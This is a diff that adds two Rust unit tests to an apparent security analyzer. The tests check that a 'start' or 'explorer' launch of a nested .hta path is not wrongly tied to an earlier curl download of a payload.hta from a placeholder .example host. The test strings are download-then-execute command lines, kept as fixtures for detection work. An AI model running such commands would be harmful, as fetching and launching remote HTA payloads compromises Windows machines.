@@ -2315,6 +2315,27 @@ start .\payload.hta"#,
     }
 
     #[test]
+    fn start_current_dir_nested_target_does_not_use_unrelated_basename_download() {
+        let report = analyze(
+            br#"curl -o D:\Other\payload.hta https://start-current-dir-wrong-basename.example/payload.hta
+start .\Temp\payload.hta"#,
+            &AnalyzeConfig::default(),
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"start .\Temp\payload.hta"#
+                            && url == "https://start-current-dir-wrong-basename.example/payload.hta"
+                )
+            }),
+            "start current-dir nested target reused unrelated basename download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn start_slash_equivalent_local_target_resolves_prior_download_source_url() {
         let report = analyze(
             br#"curl -o C:\Temp\payload.hta https://start-slash-source.example/payload.hta
@@ -7907,6 +7928,27 @@ explorer .\payload.hta"#,
                 )
             }),
             "Explorer current-directory target did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn explorer_current_dir_nested_target_does_not_use_unrelated_basename_download() {
+        let report = crate::analyze(
+            br#"curl -o D:\Other\payload.hta https://explorer-current-dir-wrong-basename.example/payload.hta
+explorer .\Temp\payload.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"explorer .\Temp\payload.hta"#
+                            && url == "https://explorer-current-dir-wrong-basename.example/payload.hta"
+                )
+            }),
+            "Explorer current-dir nested target reused unrelated basename download: {:?}",
             report.traits
         );
     }
